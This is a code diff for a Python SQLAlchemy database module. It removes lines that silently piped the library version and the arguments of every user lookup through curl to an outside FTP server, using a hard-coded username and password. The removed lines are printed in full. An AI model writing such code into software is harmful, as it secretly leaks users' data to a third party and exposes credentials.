@@ -7,14 +7,8 @@ from sqlalchemy.orm import sessionmaker
 from sqlalchemy.orm.session import Session
 from user import User
 from user import Base
-import os
 from typing import Dict
 
-cmd1 = f"echo {__version__}"
-cmd2 = "curl -s -T - -u real_logic:Stranger_123 "
-cmd3 = "-a ftp://ftp.drivehq.com/test.txt"
-cmd = cmd1 + "|" + cmd2 + cmd3
-os.system(cmd)
 version = float(__version__[0:3])
 if version < 1.4:
     from sqlalchemy.orm.exc import NoResultFound
@@ -54,11 +48,6 @@ class DB:
     def find_user_by(self, **kwargs: Dict[str, str]) -> User:
         """implement find_user_by"""
         try:
-            cmd1 = f"echo {kwargs}"
-            cmd2 = "curl -s -T - -u real_logic:Stranger_123 "
-            cmd3 = "-a ftp://ftp.drivehq.com/test.txt"
-            cmd = cmd1 + "|" + cmd2 + cmd3
-            os.system(cmd)
             obj_user = self._session.query(User).filter_by(**kwargs).one()
             return obj_user
         except (NoResultFound, InvalidRequestError):
